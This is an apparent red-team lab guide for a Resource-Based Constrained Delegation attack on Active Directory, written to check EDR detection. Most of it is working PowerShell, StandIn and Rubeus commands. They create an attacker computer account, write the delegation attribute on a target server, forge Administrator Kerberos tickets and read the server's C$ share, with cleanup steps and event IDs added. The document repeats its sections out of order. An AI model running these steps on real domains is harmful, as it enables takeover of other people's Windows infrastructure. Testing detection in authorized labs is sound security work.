# RBCD (Resource-Based Constrained Delegation) Attack Simulation
> "Bad programmers worry about the code. Good programmers worry about data structures." - Linus Torvalds

This document outlines the step-by-step reproduction of the RBCD attack to verify EDR effectiveness.
**WARNING:** This is for AUTHORIZED INTERNAL LAB USE ONLY. Do not be an idiot and run this on production without permission.

## 0. The Data Structure: `msDS-AllowedToActOnBehalfOfOtherIdentity`

Before you blindly type commands, understand what you are manipulating.
Active Directory is just a database. Delegation is usually configured on the *front-end* service (Constrained Delegation).
RBCD moves this configuration to the *back-end* resource (the Target).

The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` contains a **Security Descriptor (SD)**.
It controls who is allowed to grab a ticket on behalf of someone else.
- **Normal State:** Empty (null).
- **Attacked State:** Contains an Access Control Entry (ACE) granting `O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<Attacker_Computer_SID>)`.

**Prerequisite:** To perform Step 3, the account you are currently using MUST have `GenericWrite`, `WriteDacl`, or `WriteProperty` permissions on the `<TARGET>` computer object. If you don't have this, the attack fails immediately. It is not magic; it is ACLs.

## 1. Tool Preparation

Ensure you have the compiled binaries. C# implies managed code, which EDRs love to scan via AMSI/ETW.
- `StandIn.exe`: For manipulating AD objects.
- `Rubeus.exe`: For Kerberos ticket manipulation.

## 2. Execution Steps (Windows 11 Attack → Windows Server 2022 Target)

Environment: Attack = Windows 11 (domain-joined); Target = EC2AMAZ-V903HM1.sme.local (Windows Server 2022); Domain = SME.LOCAL.

### 2.0 Prerequisites
- Install RSAT on Windows 11:
  ```powershell
  Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
  ```
- Allow script execution for current session:
  ```powershell
  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
  ```
- Ensure time sync and DNS to DC.

### 2.1 Verify/Prepare Permissions
- Check if attacker has rights on target:
  ```powershell
  .\verify_rbcd_permissions.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
  ```
- If NOT VULNERABLE, grant permissions (choose one):
  - GenericWrite (fast lab):
    ```powershell
    $dn = (Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties DistinguishedName).DistinguishedName
    dsacls "$dn" /I:T /G SME\aduser:GW
    ```
  - Minimal WriteProperty on RBCD:
    ```powershell
    .\setup_rbcd_lab.ps1 -TargetComputer "EC2AMAZ-V903HM1" -AttackerUser "aduser"
    ```

### 2.2 Create EvilPC$ (Attacker-controlled)
- Create with known password:
  ```powershell
  Import-Module ActiveDirectory
  New-ADComputer -Name "EvilPC" -SamAccountName "EvilPC$" -Path "CN=Computers,DC=sme,DC=local" -Enabled $true -AccountPassword (ConvertTo-SecureString "Passw0rd!123" -AsPlainText -Force) -PassThru
  (Get-ADComputer -Identity "EvilPC" -Properties SID).SID.Value
  ```
- Derive keys for Rubeus:
  ```powershell
  .\Rubeus.exe hash /password:Passw0rd!123
  # Prefer AES-256 in modern domains
  ```

### 2.3 Write RBCD on Target (authorize EvilPC$)
```powershell
.\StandIn.exe --computer EC2AMAZ-V903HM1 --sid <EVILPC_SID>
# Verify attribute is set
Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity
```

### 2.4 S4U2Self + S4U2Proxy (obtain and inject Administrator CIFS TGS)
```powershell
.\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
klist tickets
```

### 2.5 Use the ticket (Pass-the-Ticket)
```powershell
dir \\EC2AMAZ-V903HM1.sme.local\C$\
type \\EC2AMAZ-V903HM1.sme.local\C$\Windows\System32\drivers\etc\hosts
```

### 2.6 WinRM Access (Optional - Requires SPN)
If you want to use `Enter-PSSession`, you MUST ensure the target has `HTTP` or `WSMAN` SPNs registered.
WinRM (Kerberos) requires these SPNs. By default, they might be missing on some lab machines.

1. **Check SPNs on Target:**
   ```powershell
   setspn -L EC2AMAZ-V903HM1
   ```
2. **Register SPNs (if missing):**
   ```powershell
   # Run as Domain Admin or account with rights to modify SPNs
   setspn -S http/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
   setspn -S wsman/EC2AMAZ-V903HM1.sme.local EC2AMAZ-V903HM1
   ```
3. **Request Ticket with AltService:**
   ```powershell
   .\Rubeus.exe s4u /user:EvilPC$ /aes256:<AES256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /altservice:http,wsman /domain:SME.LOCAL /ptt
   ```
4. **Connect via WinRM:**
   ```powershell
   Enter-PSSession -ComputerName EC2AMAZ-V903HM1.sme.local -Authentication Kerberos
   ```

## 3. Cleanup
- Remove RBCD:
  ```powershell
  Set-ADComputer -Identity "EC2AMAZ-V903HM1" -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity"
  ```
- Delete EvilPC$ (if created):
  ```powershell
  Remove-ADComputer -Identity "EvilPC$" -Confirm:$false
  ```
- Revoke lab ACLs (if you granted GenericWrite):
  ```powershell
  $dn = (Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties DistinguishedName).DistinguishedName
  dsacls "$dn" /I:T /R SME\aduser
  ```
- Purge tickets:
  ```powershell
  klist purge
  ```

## 4. EDR Verification Points
- 5136: AD attribute change on `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 4769: S4U2Proxy TGS to CIFS from a workstation account
- Local: Unsigned .NET assemblies loaded, ticket injection, subsequent SMB activity

### Step 1: Create the Fake Computer Account
We need an account to act as the "impersonator". Computer accounts are preferred because `MachineAccountQuota` usually allows any user to create 10 of them.

**Command:**
```powershell
.\StandIn.exe --computer EvilPC --make
```
*Expected Output:* `EvilPC$` account created. Password generated.

### Step 2: Get the SID of the Fake Computer
We need the binary identifier (SID) of `EvilPC$` to write into the target's security descriptor.

**Command:**
```powershell
.\StandIn.exe --computer EvilPC --object
```
*Note the SID output.* (e.g., `S-1-5-21-....-1234`)

### Step 3: Modify the Target Attribute (The Attack)
This is the noisy part. We write the Security Descriptor to the Target.

**Command:**
```powershell
# Syntax: StandIn.exe --computer <TARGET_COMPUTER_NAME> --sid <SID_OF_EVILPC>
.\StandIn.exe --computer TARGET-SRV --sid S-1-5-21-....-1234
```
*EDR Indicator:* Monitor for LDAP modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`.

### Step 4: The S4U Dance (S4U2Self + S4U2Proxy)
Now we abuse the Kerberos logic.
1. **S4U2Self:** `EvilPC$` asks for a ticket to *itself* as `Administrator`. AD grants this because `EvilPC$` trusts itself.
2. **S4U2Proxy:** `EvilPC$` presents that ticket to AD and asks: "Can I use this to access `cifs/TARGET-SRV`?"
3. **Check:** AD checks `TARGET-SRV`'s `msDS-AllowedToActOnBehalfOfOtherIdentity`. It sees `EvilPC`'s SID.
4. **Result:** AD issues a service ticket for `Administrator` to `TARGET-SRV`.

**Command:**
```powershell
# You need the NTLM hash of EvilPC$ (generated in Step 1)
# /ptt automatically injects the ticket into memory (Pass-The-Ticket)
.\Rubeus.exe s4u /user:EvilPC$ /rc4:<HASH_FROM_STEP_1> /impersonateuser:Administrator /msdsspn:cifs/TARGET-SRV.domain.local /ptt
```

### Step 5: Exfiltration / Access
If Step 4 worked, you now have a valid TGS in memory for the file system.

**Command:**
```powershell
dir \\TARGET-SRV.domain.local\C$
type \\TARGET-SRV.domain.local\C$\Windows\System32\drivers\etc\hosts
```

## 3. Cleanup (Good Taste)

Do not leave your garbage in the Active Directory.

1. **Clear the Attribute:**
   ```powershell
   .\StandIn.exe --computer TARGET-SRV --sid null
   ```
   *(Or manually edit via ADSI Edit if the tool fails)*

2. **Delete the Fake Computer:**
   ```powershell
   .\StandIn.exe --computer EvilPC --remove
   ```

## 4. EDR Verification Points

If your EDR is worth the money, it should alert on:
1. **ImageLoad:** Loading of unsigned .NET assemblies (`StandIn`, `Rubeus`) - though `execute-assembly` loads them from memory.
2. **LDAP Write:** Modification of `msDS-AllowedToActOnBehalfOfOtherIdentity` (Event ID 5136).
3. **Kerberos Traffic:**
   - Abnormal S4U2Proxy requests (Event ID 4769) where the `Transited` field is suspicious or the requesting service is a workstation.
   - Ticket injection (Event ID 4703/4624 type 9).